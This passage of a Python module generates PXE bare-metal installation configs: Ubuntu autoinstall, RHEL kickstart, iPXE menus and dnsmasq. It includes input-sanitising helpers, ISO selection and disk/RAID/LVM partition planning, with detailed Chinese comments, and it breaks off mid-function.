"""PXE 装机配置生成器。

生成四类文件：
  1. Ubuntu autoinstall (user-data, cloud-init subiquity)
  2. RHEL Kickstart (ks.cfg)
  3. iPXE 启动菜单脚本
  4. dnsmasq 配置 (DHCP + TFTP + PXE)
"""
from __future__ import annotations

import json
import re
from decimal import Decimal
from passlib.hash import sha512_crypt
import shlex
from dataclasses import dataclass, replace


# ── D7 第 3 层：输出侧兜底 ──
# 输入侧已在 schemas.py / api/pxe.py 校验，但生成器必须自己也不信任入参：
# mac/hostname 会被拼进 dnsmasq 配置、iPXE 脚本、cloud-init meta-data 与【文件名】。
_MAC_RE = re.compile(r"^[0-9a-f]{2}(:[0-9a-f]{2}){5}$")
# 主机名用字符白名单而不是严格 RFC1123：对既有合法输入（含 FQDN）保持恒等，
# 只剔除换行/分号/反引号之类可注入字符。
_HOST_UNSAFE_RE = re.compile(r"[^A-Za-z0-9.-]")
_USER_UNSAFE_RE = re.compile(r"[^A-Za-z0-9_-]")


def _safe_mac(mac) -> str:
    """只接受 aa:bb:cc:dd:ee:ff 形式的 MAC，否则返回空串（调用方跳过该条）。"""
    m = str(mac or "").strip().lower()
    return m if _MAC_RE.fullmatch(m) else ""


def _mac_tag(mac: str) -> str:
    """MAC -> 可作为 dnsmasq tag、也可安全用作文件名的片段（只含 [0-9a-f-]）。"""
    return mac.replace(":", "-")


def _safe_hostname(name, fallback="server01") -> str:
    """主机名只保留 [A-Za-z0-9.-]，其余字符剔除；清空则用 fallback。"""
    n = _HOST_UNSAFE_RE.sub("", str(name or "").strip())
    return n or fallback


def _safe_username(name, fallback="ops") -> str:
    """管理员用户名只保留 [A-Za-z0-9_-]，且不得以 '-' 开头；清空则用 fallback。

    defense-in-depth：schema 层已有白名单，但 admin_user 会落进
    RHEL kickstart 的 %post（**以 root 执行**）与 autoinstall 的 YAML，
    生成器必须自己也不信任入参。
    """
    n = _USER_UNSAFE_RE.sub("", str(name or "").strip())
    n = n.lstrip("-")
    return n or fallback


# 内核控制台默认值。放在模块级是为了让 api 层与 dataclass 默认值共用同一个来源，不会走偏。
# **默认开启串口**：PXE 装的多是机房里没接显示器的机器，装机中途失败时，串口日志是唯一能看到
# "内核收到的真实 cmdline / cloud-init 报错 / OOM / curtin 卡在哪一步" 的地方 ——
# 本项目就是靠它定案的（没有串口时白白浪费了一轮 14 分钟的装机验证，日志全是空的）。
# 顺序有讲究：最后一个 console= 才是 /dev/console。
#   默认 tty0 在前、ttyS0 在后 → /dev/console=ttyS0，安装器界面与 subiquity 日志都走串口，
#   适合无人值守/远程运维；
#   若要把界面留在显示器上（串口只收内核/ systemd 消息），改成
#   "console=ttyS0,115200 console=tty0"；置空串则完全不带 console=。
DEFAULT_KERNEL_CONSOLE = "console=tty0 console=ttyS0,115200"


@dataclass
class PxeConfig:
    os_type: str = "ubuntu"
    os_version: str = "22.04"
    hostname: str = "server01"
    timezone: str = "Asia/Shanghai"
    locale: str = "en_US.UTF-8"
    keyboard: str = "us"
    admin_user: str = "ops"
    admin_password: str = ""
    root_password: str = ""
    ssh_keys: list = None
    disk_scheme: str = "lvm"
    disk_config: dict = None
    net_mode: str = "dhcp"
    net_config: dict = None
    mirror: str = ""
    # RHEL 系：stage2（含 images/install.img 的那一层 URL）与额外仓库。
    # 为什么必须分开：把 DVD ISO 树挂出来当安装源时，包仓库是 **BaseOS/** 与 **AppStream/**
    # 两个子目录，而 `images/install.img` 在**树根**。只给 `inst.repo=<BaseOS/>` 时：
    #   · anaconda 找不到 stage2 → dracut "Could not boot / /dev/root does not exist"；
    #   · 装完包后在认证步骤崩 → SecurityInstallationError: /usr/sbin/authconfig is missing
    #     （authconfig 在 AppStream 里，而贴出的 kickstart 有 auth --enableshadow）。
    # 两者都有真机串口实证。api 层会在 mirror 是本机发布目录时自动探测这两项，
    # 运维通常只需填 mirror。
    stage2: str = ""
    extra_repos: list = None    # [{"name": "AppStream", "url": "http://.../AppStream/"}]
    extra_packages: list = None
    post_script: str = ""
    server_ip: str = "192.168.1.100"
    http_root: str = "http://192.168.1.100:8000/pxe/serve"
    kernel_path: str = "ubuntu/22.04/vmlinuz"
    initrd_path: str = "ubuntu/22.04/initrd"
    squashfs_path: str = "ubuntu/22.04/installer.squashfs"
    # 内核控制台，见 DEFAULT_KERNEL_CONSOLE 的说明
    kernel_console: str = DEFAULT_KERNEL_CONSOLE
    # 可挂载的安装介质 URL（casper 的 url= 参数）。
    # 为什么必须有它：live-server 的 casper 需要一个**可挂载介质**才能建立 live 文件系统。
    # 旧写法用相对位置参数 `--- ubuntu/22.04/installer.squashfs` 实测直接失败：
    #   "Unable to find a medium containing a live file system"
    # 而 `url=http://host/pxe/iso/xxx.iso` 实测可用。见 _ipxe_menu() 的注释。
    iso_url: str = ""
    # 该 ISO 的大小（MB）。由 api 层 stat 后填进来，生成器保持纯函数；
    # 只用于在 README 里给出"目标机内存要多大"的具体数字。
    iso_size_mb: int = 0
    deploy_mode: str = "standalone"  # standalone(独立DHCP) / proxy(ProxyDHCP) / relay(中继模式)


# 装机流程只有两条：ubuntu（casper/autoinstall）与 RHEL 家族（anaconda/kickstart）。
# RHEL 家族与 rhel 完全同构 —— 同一套 inst.* 参数、同一个 kickstart 生成器，
# 介质文件名也一样是 initrd.img（不是 Ubuntu 的 initrd）。
# 校验层 schemas._OS_TYPE_ALLOWED 必须与此一致，有测试锁住两者不漂移。
RHEL_FAMILY = ("rhel", "centos", "rocky", "alma", "almalinux", "redhat")


def is_rhel_family(os_type) -> bool:
    """是否属于 RHEL 家族（决定走 anaconda 分支与 initrd.img 介质路径）。"""
    return (os_type or "").strip().lower() in RHEL_FAMILY


# Ubuntu ISO 文件名里 OS 类型的关键字（用于自动挑选镜像）
_ISO_TYPE_KEYS = {
    "ubuntu": ("ubuntu",),
    "rhel": ("rhel", "redhat", "centos", "rocky", "almalinux", "oraclelinux"),
}


# 版本号按"数字段边界"抽取，避免子串误配：ver="9" 不该命中 "Rocky-19.4"，
# "22.04" 也不该命中 "122.04"。
_ISO_VER_RE = re.compile(r"(?<![0-9])(\d+(?:\.\d+)*)(?![0-9])")


def _iso_versions(name: str) -> list:
    """取出文件名里的所有版本号候选（小写）。"""
    return _ISO_VER_RE.findall(name.lower())


def pick_iso(names, os_type: str, os_version: str) -> str:
    """从 /srv/opstk/iso 的文件名列表里挑出最匹配 os_type/os_version 的那个 ISO。

    纯函数（不做 I/O），便于单测。返回文件名，挑不到返回 ""。

    匹配规则（正式环境里同目录会同时存在多个系统镜像，必须挑准）：
      1. 必须含该 OS 类型的任一关键字；
      2. 版本按**数字段边界**匹配：查询 `22.04` 命中文件名里的 `22.04` 或 `22.04.5`，
         但不命中 `24.04`；查询 `9` 命中 `9`/`9.4`，但不命中 `19.4`
         （旧实现用 `ver in low` 子串匹配，会被 `Rocky-19.x` 这类名字误配）；
      3. 只认 .iso；
      4. 优先级：版本号段数多者优先（22.04.5 比 22.04 更精确）→ live-server 优先
         → 文件名排序兜底，保证结果确定、可复现。
    """
    ost = (os_type or "ubuntu").strip().lower()
    ver = (os_version or "").strip().lower()
    keys = _ISO_TYPE_KEYS.get(ost, (ost,))
    cands = []
    for n in names or []:
        base = str(n).strip()
        low = base.lower()
        if not low.endswith(".iso"):
            continue
        if not any(k in low for k in keys):
            continue
        if not ver:
            score = 0
        else:
            hit = None
            for tok in _iso_versions(low):
                if tok == ver or tok.startswith(ver + "."):
                    hit = tok
                    break
            if hit is None:
                continue
            # 段数取自**文件名里实际命中的那个版本**。旧实现写的是 len(ver.split("."))，
            # 对一次查询而言是常量，"版本段数多者优先（22.04.5 > 22.04）"实际从未生效。
            score = len(hit.split("."))
        cands.append((score, "live-server" in low, base))
    if not cands:
        return ""
    cands.sort(key=lambda t: (t[0], t[1], t[2]))
    return cands[-1][2]


def _hash_pw(plaintext):
    # 空/None 口令直接拒绝：这是裸机 root/管理员口令，绝不代填任何默认口令
    if not plaintext:
        raise ValueError("管理员密码不能为空；这是裸机 root 口令，不允许留空")
    return sha512_crypt.using(rounds=5000).hash(plaintext)


# ===== 磁盘与分区（方案 C：任意分区表 + LVM/RAID + 自动选盘）=====
# 规格见 docs/PARTITION.md。三条设计原则，改动前务必先读：
#   1) **向后兼容是红线**：disk_config 缺省/空，或只含历史键 "disk"（前端 Pxe.vue 一直
#      只发 {disk: <盘名>}）时，_disk_plan() 返回 None → 走【既有路径】，生成的每个字节
#      与改造前逐字一致；
#   2) 新字段一律先过白名单，风格与既有 _safe_line/_safe_ident 一致 —— 这些值会被拼进
#      kickstart 与 autoinstall YAML，一个换行/空格就能改掉语法结构；
#   3) 盘名不许写死：auto 模式在 RHEL 侧用 %pre+%include 现场挑盘（ks 没有"自动选盘"
#      原语），Ubuntu 侧用 subiquity 的 match: {size: largest}。
_SIZE_RE = re.compile(r"^[0-9]+(\.[0-9]+)?[MGTP]$|^rest$|^100%FREE$")
_FSTYPE_ALLOWED = ("ext4", "xfs", "btrfs", "fat32", "vfat", "swap")
_MOUNT_RE = re.compile(r"^/[A-Za-z0-9._/-]*$")
_RAID_LEVELS = (0, 1, 5, 6, 10)
_DISK_MODES = ("auto", "name", "match")
_DISK_LAYOUTS = ("lvm", "direct", "zfs", "custom")
_SIZE_UNIT = {"M": 1024 ** 2, "G": 1024 ** 3, "T": 1024 ** 4, "P": 1024 ** 5}
# "吃掉剩余空间"的两种写法：kickstart 用 --grow，subiquity 用字符串 "rest"
_GROW_SIZES = ("rest", "100%FREE")
# /boot/efi 与 /boot 在 GPT 上的分区标志（规格 §3.4）
_PART_FLAGS = {"/boot/efi": "esp", "/boot": "boot"}
# kickstart 里 raid 成员/物理卷的标识形式；与 §3.3 的 part.NN 同属一套"第 N 个分区"语义
_RAID_DEV_RE = re.compile(r"^(?:(?:sd|vd|hd|xvd)[a-z]|nvme[0-9]+n[0-9]+|mmcblk[0-9]+)p?([0-9]+)$")


def _as_bool(v, field, default=False) -> bool:
    """把 JSON 里的布尔（含前端可能发来的 "true"/1）收敛成 bool；其余一律拒绝。"""
    if v is None or v == "":
        return default
    if isinstance(v, bool):
        return v
    if isinstance(v, int):
        return bool(v)
    s = _safe_line(v, field).strip().lower()
    if s in ("true", "1", "yes", "on"):
        return True
    if s in ("false", "0", "no", "off"):
        return False
    raise ValueError(field + " 必须是布尔值，收到 " + repr(v))


def _safe_size(v, field="disk_config 分区尺寸") -> str:
    """尺寸白名单：512M / 20G / 1.5T / rest / 100%FREE（规格 §2）。"""
    s = _safe_line(v, field).strip()
    if not _SIZE_RE.fullmatch(s):
        raise ValueError(
            field + " 非法 " + repr(s) + "：只允许 <数字>[MGTP] / rest / 100%FREE"
        )
    return s


def _safe_mount(v, field="disk_config 挂载点") -> str:
    """挂载点白名单：空串（只建分区不挂载）、swap，或以 / 开头的绝对路径且不含 ..。"""
    s = _safe_line(v, field).strip()
    if s in ("", "swap"):
        return s
    if not _MOUNT_RE.fullmatch(s) or ".." in s:
        raise ValueError(
            field + " 非法 " + repr(s) + "：必须是 / 开头的绝对路径（只允许 [A-Za-z0-9._/-]），且不含 .."
        )
    return s


def _safe_fstype(v, field="disk_config 文件系统", mount="") -> str:
    """fstype 白名单；/boot/efi 强制 fat32（UEFI 必需）、swap 挂载点强制 swap。"""
    s = _safe_line(v, field).strip().lower()
    if mount == "/boot/efi":
        return "fat32"
    if mount == "swap":
        return "swap"
    if s == "":
        return ""
    if s not in _FSTYPE_ALLOWED:
        raise ValueError(
            field + " 非法 " + repr(s) + "：白名单 " + "|".join(_FSTYPE_ALLOWED)
        )
    return s


def _human_size_to_bytes(v):
    """人读尺寸 -> subiquity 需要的字节数（规格 §3.4）。rest/100%FREE 原样返回 "rest"。

    用 Decimal 而不是 float：1.5G 必须是 1610612736，不能因为二进制浮点误差差几个字节。
    """
    s = _safe_size(v)
    if s in _GROW_SIZES:
        return "rest"
    return int(Decimal(s[:-1]) * _SIZE_UNIT[s[-1]])


def _size_mb(v):
    """人读尺寸 -> kickstart 的整数 MB；grow 类返回 None（调用方改用 --grow）。"""
    s = _safe_size(v)
    if s in _GROW_SIZES:
        return None
    return max(1, int(Decimal(s[:-1]) * _SIZE_UNIT[s[-1]]) // (1024 * 1024))


def _disk_config_active(dc) -> bool:
    """disk_config 是否启用了【结构化】磁盘配置。

    只有历史键 "disk"（或空/缺省）→ False，走既有路径（规格 §5.1 回归红线）。
    """
    if not dc:
        return False
    return any(k != "disk" for k in dc)


def _raid_member_index(tok, partitions, field):
    """把 raid.devices 里的分区标识解析成 partitions 的下标。

    规格 §3.3 的规范写法是 `part.01`（1 起）；同时接受 `part0`（subiquity 侧 0 起）
    与 §2 示例里的 `sda4`（盘名+分区号，按 1 起算）—— 三种写法都映射到同一套
    "第 N 个分区" 语义，生成物里永远只出现我们自己算出的标识。
    """
    s = _safe_ident(tok, field)
    avail = ", ".join(p["id_ks"] for p in partitions) or "(partitions 为空)"
    idx = None
    m = re.fullmatch(r"part\.0*([0-9]+)", s)
    if m:
        idx = int(m.group(1)) - 1
    else:
        m = re.fullmatch(r"part([0-9]+)", s)
        if m:
            idx = int(m.group(1))
        else:
            m = _RAID_DEV_RE.fullmatch(s)
            if m:
                idx = int(m.group(1)) - 1
    if idx is None or not 0 <= idx < len(partitions):
        raise ValueError(
            field + " 引用了未定义的分区标识 " + repr(tok) + "；本次可用标识：" + avail
        )
    return idx


def _disk_plan(c, dc):
    """把 disk_config 归一化为内部结构；返回 None 表示走【既有路径】（逐字不变）。

    这里做第 3 层校验（第 2 层在 schemas.PxeDiskConfigIn）：白名单、rest 只能一次且在最后、
    /boot/efi 与 / 的搭配、vg/lv 必须成对、raid 引用必须已定义、data_disks 不得与目标盘同名。
    """
    if not _disk_config_active(dc):
        return None

    tgt = dc.get("target") or {}
    if not isinstance(tgt, dict):
        raise ValueError("disk_config.target 必须是对象")

    legacy_disk = _safe_ident(dc.get("disk", ""), "disk_config.disk")
    mode_raw = tgt.get("mode")
    if mode_raw in (None, ""):
        # 没显式给 mode：有盘名（历史键 disk 或 target.name）就按 name，否则自动选盘
        mode = "name" if (legacy_disk or tgt.get("name")) else "auto"
    else:
        mode = _safe_ident(mode_raw, "disk_config.target.mode").strip().lower()
        if mode not in _DISK_MODES:
            raise ValueError(
                "disk_config.target.mode 非法 " + repr(mode_raw) + "：只允许 auto|name|match"
            )

    name = _safe_ident(tgt.get("name", "") or legacy_disk, "disk_config.target.name")
    serial = _safe_ident(tgt.get("serial", ""), "disk_config.target.serial", extra=" ")
    model = _safe_ident(tgt.get("model", ""), "disk_config.target.model", extra=" ")
    if mode == "auto":
        # 规格 §2 明文要求：auto 必须忽略 name，避免"以为自动其实写死"
        name = ""
    if mode == "name" and not name:
        raise ValueError("disk_config.target.mode=name 但没有给出 disk_config.target.name")
    if mode == "match" and not (serial or model):
        raise ValueError("disk_config.target.mode=match 但没有给出 serial 或 model")

    min_gb = 0
    mg = tgt.get("min_size_gb")
    if mg not in (None, ""):
        if isinstance(mg, bool):
            raise ValueError("disk_config.target.min_size_gb 必须是整数")
        s = _safe_line(mg, "disk_config.target.min_size_gb").strip()
        try:
            min_gb = int(s)
        except ValueError:
            raise ValueError("disk_config.target.min_size_gb 必须是整数：" + repr(mg))
        if min_gb < 0:
            raise ValueError("disk_config.target.min_size_gb 不能为负数")

    wipe = _as_bool(dc.get("wipe"), "disk_config.wipe", default=True)

    raw_layout = dc.get("layout")
    if raw_layout in (None, ""):
        # 结构化配置没给 layout 时沿用既有 disk_scheme（未知值同既有行为回退 lvm）
        layout = c.disk_scheme if c.disk_scheme in _DISK_LAYOUTS else "lvm"
    else:
        layout = _safe_ident(raw_layout, "disk_config.layout").strip().lower()
        if layout not in _DISK_LAYOUTS:
            raise ValueError(
                "disk_config.layout 非法 " + repr(raw_layout) + "：只允许 lvm|direct|zfs|custom"
            )

    parts_in = dc.get("partitions") or []
    if not isinstance(parts_in, list):
        raise ValueError("disk_config.partitions 必须是数组")
    partitions = []
    for i, p in enumerate(parts_in):
        if not isinstance(p, dict):
            raise ValueError("disk_config.partitions[%d] 必须是对象" % i)
        f = "disk_config.partitions[%d]" % i
        mount = _safe_mount(p.get("mount", ""), f + ".mount")
        size = _safe_size(p.get("size", ""), f + ".size")
        vg = _safe_ident(p.get("vg", ""), f + ".vg")
        lv = _safe_ident(p.get("lv", ""), f + ".lv")
        if bool(vg) != bool(lv):
            raise ValueError(f + "：vg 与 lv 必须同时给出（只给其一是非法配置）")
        fstype = _safe_fstype(p.get("fstype", ""), f + ".fstype", mount)
        if not size and not (vg and lv):
            raise ValueError(f + ".size 不能为空")
        if size in _GROW_SIZES and i != len(parts_in) - 1:
            raise ValueError(f + ".size=" + size + " 只能出现在最后一个分区")
        partitions.append({
            "index": i, "mount": mount, "size": size, "fstype": fstype,
            "vg": vg, "lv": lv,
            "id_ks": "part.%02d" % (i + 1),      # ks 侧标识，1 起（规格 §3.3）
            "id_sub": "part%d" % i,              # subiquity 侧标识，0 起（规格 §3.4）
        })
    grow = [p for p in partitions if p["size"] in _GROW_SIZES]
    if len(grow) > 1:
        raise ValueError("disk_config.partitions：rest/100%FREE 只能出现一次")
    # 一个 VG 里最多一个 LV 能吃"剩余空间"：再多就无从分配（主体已保证 rest 在最后，
    # 这里再按 VG 收一次口，并指出到底是第几个 partition）。
    for vg in _plan_volgroups({"partitions": partitions}):
        grow_vg = [p for p in partitions if p["vg"] == vg and p["size"] in _GROW_SIZES]
        if len(grow_vg) > 1:
            raise ValueError(
                "disk_config.partitions[%d].size：同一 VG(%s) 内只能有一个 lv 用 rest/100%%FREE"
                % (grow_vg[1]["index"], vg)
            )
    mounts = [p["mount"] for p in partitions]
    if mounts.count("/boot/efi") > 1:
        raise ValueError("disk_config.partitions：/boot/efi 只能有 0 或 1 个")
    if "/boot/efi" in mounts and "/" not in mounts:
        raise ValueError("disk_config.partitions：有 /boot/efi 却没有 / 分区（系统起不来）")

    raid_out = []
    for j, r in enumerate(dc.get("raid") or []):
        if not isinstance(r, dict):
            raise ValueError("disk_config.raid[%d] 必须是对象" % j)
        f = "disk_config.raid[%d]" % j
        lvl_raw = r.get("level", 1)
        if isinstance(lvl_raw, bool):
            raise ValueError(f + ".level 必须是整数 0/1/5/6/10")
        s = _safe_line(lvl_raw, f + ".level").strip()
        try:
            level = int(s)
        except ValueError:
            raise ValueError(f + ".level 必须是整数 0/1/5/6/10：" + repr(lvl_raw))
        if level not in _RAID_LEVELS:
            raise ValueError(f + ".level 非法 " + repr(lvl_raw) + "：只允许 0/1/5/6/10")
        devs = r.get("devices") or []
        if not isinstance(devs, list) or not devs:
            raise ValueError(f + ".devices 不能为空")
        idxs = [_raid_member_index(d, partitions, f + ".devices") for d in devs]
        rmount = _safe_mount(r.get("mount", ""), f + ".mount")
        raid_out.append({
            "name": _safe_ident(r.get("name", ""), f + ".name") or ("md%d" % j),
            "level": level,
            "member_indexes": idxs,
            "mount": rmount,
            "fstype": _safe_fstype(r.get("fstype", ""), f + ".fstype", rmount),
            "id_sub": "md%d" % j,
        })

    data = []
    for k, d in enumerate(dc.get("data_disks") or []):
        if not isinstance(d, dict):
            raise ValueError("disk_config.data_disks[%d] 必须是对象" % k)
        f = "disk_config.data_disks[%d]" % k
        dname = _safe_ident(d.get("name", ""), f + ".name")
        if not dname:
            raise ValueError(f + ".name 不能为空")
        if name and dname == name:
            raise ValueError(f + ".name 不能与目标盘同名 " + repr(dname))
        dmount = _safe_mount(d.get("mount", ""), f + ".mount")
        data.append({
            "name": dname, "mount": dmount,
            "fstype": _safe_fstype(d.get("fstype", ""), f + ".fstype", dmount),
            # 生产红线：数据盘默认不碰，必须显式 wipe=true 才动（规格 §2）
            "wipe": _as_bool(d.get("wipe"), f + ".wipe", default=False),
        })

    return {
        "mode": mode, "name": name, "serial": serial, "model": model,
        "min_size_gb": min_gb, "wipe": wipe, "layout": layout,
        "partitions": partitions, "raid": raid_out, "data_disks": data,
    }


def _plan_volgroups(plan) -> list:
    """按首次出现顺序返回 partitions 里用到的 vg 名（一个 vg 只输出一次 volgroup）。"""
    out = []
    for p in plan["partitions"]:
        if p["vg"] and p["vg"] not in out:
            out.append(p["vg"])
    return out


# ---- Ubuntu / subiquity ----

def _ubuntu_disk_match(plan):
    """目标盘在 subiquity 里的表达（规格 §3.1）。"""
    if plan["mode"] == "name":
        return {"path": "/dev/" + plan["name"]}
    if plan["mode"] == "match":
        m = {}
        if plan["serial"]:
            m["serial"] = plan["serial"]
        if plan["model"]:
            m["model"] = plan["model"]
        return m
    return {}


def _ubuntu_storage_obj(plan):
    """layout != custom → 官方 layout 简写；custom → storage.version/config（规格 §3.4）。"""
    if plan["layout"] != "custom":
        cfg = {"name": plan["layout"]}
        if plan["mode"] == "auto":
            # subiquity 支持 size: largest；min_size_gb 在下限语义上表达不出来，
            # 所以只认"最大盘"，下限由 RHEL 侧（%pre 里 lsblk）与文档保证。
            cfg["match"] = {"size": "largest"}
        else:
            cfg["match"] = _ubuntu_disk_match(plan)
        return {"layout": cfg}

    if plan["mode"] == "auto":
        raise ValueError(
            "Ubuntu 的 layout=custom 需要明确的目标盘：subiquity 的自定义 storage.config "
            "没有\"自动挑最大盘\"的写法，请把 disk_config.target.mode 设为 name 或 match"
        )

    cfg = []
    disk = {"type": "disk", "id": "disk0"}
    disk.update(_ubuntu_disk_match(plan))
    disk["wipe"] = bool(plan["wipe"])
    cfg.append(disk)

    raid_members = set()
    for r in plan["raid"]:
        raid_members.update(r["member_indexes"])

    fmt_n = [0]
    mnt_n = [0]
    lv_n = [0]
    mounts = []

    def _format(volume, fstype):
        fid = "fmt%d" % fmt_n[0]
        fmt_n[0] += 1
        cfg.append({"type": "format", "id": fid, "volume": volume, "fstype": fstype})
        return fid

    for p in plan["partitions"]:
        e = {"type": "partition", "id": p["id_sub"], "device": "disk0",
             "size": _human_size_to_bytes(p["size"])}
        if _PART_FLAGS.get(p["mount"]):
            e["flag"] = _PART_FLAGS[p["mount"]]
        cfg.append(e)
        if p["vg"] or p["index"] in raid_members:
            # LVM PV / RAID 成员本身不建文件系统
            continue
        fstype = p["fstype"] or ("ext4" if p["mount"] and p["mount"] != "swap" else "")
        if not fstype:
            continue                      # 只建分区不挂载
        fid = _format(p["id_sub"], fstype)
        if p["mount"] and p["mount"] != "swap":
            mounts.append((fid, p["mount"]))

    for r in plan["raid"]:
        cfg.append({"type": "raid", "id": r["id_sub"], "name": r["name"],
                    "raidlevel": r["level"],
                    "devices": [plan["partitions"][i]["id_sub"] for i in r["member_indexes"]]})
        fid = _format(r["id_sub"], r["fstype"] or "ext4")
        if r["mount"]:
            mounts.append((fid, r["mount"]))

    for vg in _plan_volgroups(plan):
        cfg.append({"type": "lvm_volgroup", "id": vg, "name": vg,
                    "devices": [p["id_sub"] for p in plan["partitions"] if p["vg"] == vg]})
    for p in plan["partitions"]:
        if not p["vg"]:
            continue
        lv_id = "lv%d" % lv_n[0]
        lv_n[0] += 1
        cfg.append({"type": "lvm_partition", "id": lv_id, "volgroup": p["vg"],
                    "name": p["lv"], "size": _human_size_to_bytes(p["size"])})
        fid = _format(lv_id, p["fstype"] or ("swap" if p["mount"] == "swap" else "ext4"))
        if p["mount"] and p["mount"] != "swap":
            mounts.append((fid, p["mount"]))

    for dev, path in mounts:
        cfg.append({"type": "mount", "id": "mnt%d" % mnt_n[0], "device": dev, "path": path})
        mnt_n[0] += 1
    return {"version": 1, "config": cfg}


# ---- RHEL / anaconda ----

def _rhel_layout_lines(scheme, disk) -> str:
    """既有 layout 简写的 ks 行（lvm/direct/zfs）。

    disk_config 缺省时**必须逐字命中**本函数返回值（回归红线 §5.1）——所以这里只做
    参数替换，标点/顺序/空格一个都不许动。zfs 沿用既有行为（与 lvm 同构）。
    """
    if scheme == "direct":
        return (
            "clearpart --drives=" + disk + " --all --initlabel\n"
            "part /boot/efi --fstype=efi --size=512\n"
            "part / --fstype=ext4 --ondisk=" + disk + " --grow\n"
            "part swap --size=8192\n"
        )
    return (
        "clearpart --drives=" + disk + " --all --initlabel\n"
        "part /boot/efi --fstype=efi --size=512\n"
        "part /boot --fstype=ext4 --size=1024\n"
        "part pv.01 --size=1 --grow\n"
        "volgroup vg0 pv.01\n"
        "logvol / --vgname=vg0 --name=root --size=20480 --fstype=ext4\n"
        "logvol swap --vgname=vg0 --name=swap --size=8192\n"
        "logvol /home --vgname=vg0 --name=home --size=10240 --fstype=ext4\n"
    )


def _rhel_boot_location(plan) -> str:
    """显式盘名（Python 侧直接输出）时的 bootloader 位置。

    **实测结论：一律 mbr，UEFI 也是 mbr。**
    真机（VM141，OVMF + 自带 /boot/efi 的自定义分区表）跑出来的是：
        An error occurred during reading the kickstart file:
        GRUB2 does not support installation to a partition.
        The installer will now terminate.
    `--location=partition` 是 syslinux/extlinux 时代的写法；RHEL 8+ 的 GRUB2 不接受。
    UEFI 下写 `mbr` 时，anaconda 自己会把 grub2-efi/shim 装进 ESP —— 不需要（也不能）按固件分支。
    """
    return "mbr"


def _rhel_ondisk(size) -> str:
    """ks 里分区的尺寸参数：--size=<MB>，rest/100%FREE → --grow。"""
    mb = _size_mb(size)
    return "--grow" if mb is None else "--size=" + str(mb)


def _rhel_lv_ondisk(size) -> str:
    """ks 里 LVM 逻辑卷的尺寸参数：rest → `--size=1 --grow`（anaconda 要求给个基数）。"""
    mb = _size_mb(size)
    return "--size=1 --grow" if mb is None else "--size=" + str(mb)


def _rhel_custom_lines(plan, disk) -> list:
    """layout=custom 的 ks 行（规格 §3.3/§3.4）：part/volgroup/logvol/raid 全部 --ondisk=<disk>。"""
    lines = ["ignoredisk --only-use=" + disk]
    drives = [disk] + [d["name"] for d in plan["data_disks"] if d["wipe"]]
    if plan["wipe"]:
        lines.append("clearpart --drives=" + ",".join(drives) + " --all --initlabel")
    else:
        lines.append("# disk_config.wipe=false：不执行 clearpart（沿用磁盘上已有分区表）")
    for d in plan["data_disks"]:
        if not d["wipe"]:
            # 生产红线：没确认就不动数据盘
            lines.append("ignoredisk --drives=" + d["name"])

    # PV / RAID 成员标识都按"出现顺序"从 01 起编号，与 §3.3 的 part.NN 同属一套
    # "第 N 个分区"语义（输入侧的 part.NN 是位置编号，输出侧只出现我们自己算的标识）。
    pv_of = {}
    raid_members = {}
    for p in plan["partitions"]:
        if p["vg"]:
            pv_of[p["index"]] = "pv.%02d" % (len(pv_of) + 1)
    for r in plan["raid"]:
        for i in sorted(r["member_indexes"]):
            if i not in raid_members:
                raid_members[i] = "raid.%02d" % (len(raid_members) + 1)

    for p in plan["partitions"]:
        ident = pv_of.get(p["index"]) or raid_members.get(p["index"]) or p["id_ks"]
        is_pv = p["index"] in pv_of
        is_raid = p["index"] in raid_members
        opts = ["--ondisk=" + disk, _rhel_ondisk(p["size"])]
        if not is_pv and not is_raid:
            # PV / RAID 成员自身不建文件系统：fstype 属于 logvol / raid 那一行
            if p["mount"] == "/boot/efi":
                opts.insert(0, "--fstype=efi")
            elif p["fstype"]:
                opts.insert(0, "--fstype=" + p["fstype"])
        lines.append("part " + (ident if (is_pv or is_raid) else (p["mount"] or ident))
                     + " " + " ".join(opts))

    for r in plan["raid"]:
        devs = " ".join(raid_members[i] for i in r["member_indexes"])
        tail = (" --fstype=" + r["fstype"]) if r["fstype"] else ""
        lines.append("raid %s --level=%d --device=%s%s %s"
                     % (r["mount"] or r["name"], r["level"], r["name"], tail, devs))

    for vg in _plan_volgroups(plan):
        pvs = " ".join(pv_of[p["index"]] for p in plan["partitions"] if p["vg"] == vg)
        lines.append("volgroup " + vg + " " + pvs)
    for p in plan["partitions"]:
        if not p["vg"]:
            continue
        opts = ["--vgname=" + p["vg"], "--name=" + p["lv"], _rhel_lv_ondisk(p["size"])]
        if p["fstype"]:
            opts.append("--fstype=" + p["fstype"])
        lines.append("logvol " + (p["mount"] or p["lv"]) + " " + " ".join(opts))

    for d in plan["data_disks"]:
        if d["wipe"] and d["mount"]:
            lines.append("part %s --fstype=%s --size=1 --grow --ondisk=%s"
                         % (d["mount"], d["fstype"] or "ext4", d["name"]))
    return lines


def _rhel_pick_target_lines(plan) -> list:
    """%pre 里现场挑目标盘（规格 §3.1）：ks 没有"自动选盘"原语，只能脚本化。"""
    lines = ["# 选出目标盘：非可移动、非光驱、容量 >= min_size_gb、按名排序取第一块"]
    if plan["mode"] == "match":
        key = plan["serial"] or plan["model"]
        lines.append(
            "target=$(lsblk -dn -o NAME,SERIAL,MODEL | awk -v s='%s' "
            "'$2==s || $3==s {print $1}' | sort | head -1)" % key
        )
    elif plan["min_size_gb"]:
        # 只有给了下限才用 -b（字节）比较，否则与规格原文的 lsblk -dn 保持一致
        lines.append(
            "target=$(lsblk -bdn -o NAME,TYPE,RM,TRAN,SIZE | awk "
            "'$2==\"disk\" && $3==\"0\" && $4!=\"usb\" && $5>=%d {print $1}' | sort | head -1)"
            % (int(plan["min_size_gb"]) * 1024 ** 3)
        )
    else:
        lines.append(
            "target=$(lsblk -dn -o NAME,TYPE,RM,TRAN,SIZE | awk "
            "'$2==\"disk\" && $3==\"0\" && $4!=\"usb\" {print $1}' | sort | head -1)"
        )
    lines.append("if [ -z \"$target\" ]; then "
                 "echo 'PXE: 未找到可用的目标磁盘，装机中止' >&2; exit 1; fi")
    return lines


def _rhel_disk_block(plan, use_pre) -> list:
    """结构化配置下的磁盘行。

    use_pre=True（auto/match）：clearpart/part/volgroup/logvol/bootloader **全部**
    移进 %pre 生成的 /tmp/disk.ks，主体里不再出现（规格 §3.1，否则重复声明）。
    """
    custom = plan["layout"] == "custom"
    disk = "$target" if use_pre else plan["name"]

    if custom:
        body = _rhel_custom_lines(plan, disk)
        if use_pre:
            boot = "bootloader --location=mbr --boot-drive=$target"
        else:
            boot = ("bootloader --location=" + _rhel_boot_location(plan)
